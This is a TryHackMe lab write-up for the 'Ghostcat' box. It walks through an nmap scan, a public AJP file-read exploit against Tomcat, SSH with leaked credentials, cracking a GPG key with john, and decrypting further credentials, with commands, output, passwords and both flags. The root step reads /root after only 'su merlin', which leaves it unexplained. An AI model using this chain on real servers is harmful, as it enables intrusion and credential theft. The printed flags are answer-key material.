---
title: Ghostcat
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Ghostcat
  machine on TryHackMe.
slug: ghostcat
---




## TL;DR (short summary)
- Target: `10.201.72.230`.
- Open ports discovered: `22` (ssh), `53` (dns), `8009` (AJP13), `8080` (HTTP).
- AJP (8009) was vulnerable to Ghostcat (CNVD-2020-10487). Using an AJP exploit (AJPShooter/Ghostcat) I read `/WEB-INF/web.xml` and discovered credentials `skyfuck:8730281lkjlkjdqlksalks`.
- SSH into the machine as `skyfuck`, found `credential.pgp` and `tryhackme.asc` in `/home/skyfuck`.
- Downloaded both files with `scp`, cracked the `.asc` (`gpg2john` → `john`), used the recovered password to decrypt `credential.pgp` (`gpg --decrypt`) and recovered additional credentials which enabled privilege escalation to root and retrieval of the root flag.

## Environment / tools (what I used)

- Tools and utilities used:
  - `nmap` — port scanning
  - `python3` — to run AJPShooter/Ghostcat PoC
  - `git` — clone exploit repo
  - `ssh` / `scp` — remote login and file transfer
  - `john` and `gpg2john` (from `john` package) — crack passphrase for GPG encrypted file
  - `gpg` — decrypt `credential.pgp`
  - `wordlist` - types of pwds

> Install quick reference (Kali/Debian):
```bash
sudo apt update && sudo apt install -y nmap git python3 python3-pip john gpg
# Note: gpg2john is usually included with the 'john' package or in john-contrib.
```

**Placeholders for outputs:** replace the `<!-- ADD: ... -->` markers with your screenshot filenames or paste terminal outputs in the indicated places.


## 1) Recon — Nmap
**Command used:**
```bash
nmap 10.201.72.230
```

**Key output**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 15:29 EDT
Nmap scan report for 10.201.72.230
Host is up (0.36s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy
Nmap done: 1 IP address (1 host up) scanned in 24.42 seconds
```

**Notes:** AJP (8009) is often used by Tomcat and has had known vulnerabilities (Ghostcat). When you see `ajp13` open together with an HTTP port (8080), Ghostcat is likely.



## 2) Exploit — Ghostcat / AJPShooter
**What I used:** the AJPShooter / Ghostcat POC repo:
```
https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
```

**Commands:**
```bash
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
cd Ghostcat-CNVD-2020-10487
python3 ajpShooter.py http://10.201.72.230:8080 8009 /WEB-INF/web.xml read
```

**Key Output**
```
... (AJPShooter banner and HTTP headers) ...

<?xml version="1.0" encoding="UTF-8"?>
...
<web-app ...>
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>
</web-app>
```

**Tip:** Save the `web.xml` output or screenshot it. That contains the plaintext credential.

---

## 3) Initial access — SSH
**SSH into the box using the found credentials:**
```bash
ssh skyfuck@10.201.72.230
# password: 8730281lkjlkjdqlksalks
```

**Key Output**
```
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

Check other user homes:
```
skyfuck@ubuntu:/home$ cd merlin
skyfuck@ubuntu:/home/merlin$ ls
user.txt
skyfuck@ubuntu:/home/merlin$ cat user.txt
THM{GhostCat_1s_so_cr4sy}
```

---

## 4) Exfiltrate files for offline cracking

**Command**
```bash
scp skyfuck@10.201.72.230:/home/skyfuck/* .
# or scp skyfuck@10.201.72.230:/home/skyfuck/credential.pgp .
```

**Example output**
```
credential.pgp
tryhackme.asc
```

---

## 5) Crack the passphrase for the .asc file (offline cracking)
**Reasoning:** `tryhackme.asc` is an encrypted key or file. `gpg2john` converts GPG files into a john-readable hash format.

**Commands:**
```bash
gpg2john tryhackme.asc > tryhackme.hash
john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.hash
```

**Key output**
```
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 ...
1g 0:00:00:00 DONE (2025-09-28 15:49) 5.555g/s ... alexandru (tryhackme)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Note:** if you name the output file `tryhackme.hash`, use that filename when invoking `john`. In some runs the file was named `hash`; be consistent.

---

## 6) Decrypt `credential.pgp` with the cracked passphrase
**Command:**
```bash
gpg --decrypt credential.pgp
# enter the passphrase john found when prompted
```

**Example gpg output**
```
gpg: encrypted with elg1024 key, ID 61E104A6..., created 2020-03-11
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

> The decrypted content gave `merlin:<password>` which you can use to log in as `merlin`.

**Security note:** avoid publishing real, sensitive passwords on public repos — replace with `[REDACTED]` if you post publicly.

---

## 7) Use recovered credentials to escalate to root

**Steps you took:**
- You switched to the `merlin` user:
```bash
su merlin
```
- From there you accessed the root directory and read the flag:
```bash
cd /root
ls
cat root.txt
# THM{Z1P_1S_FAKE}
```

**Additional recommended checks (for writeup):**
- Run `sudo -l` (as merlin or skyfuck) to check sudo rights before attempting `su`.
- Capture the output of `id` after switching users to show context: `id`, `whoami`.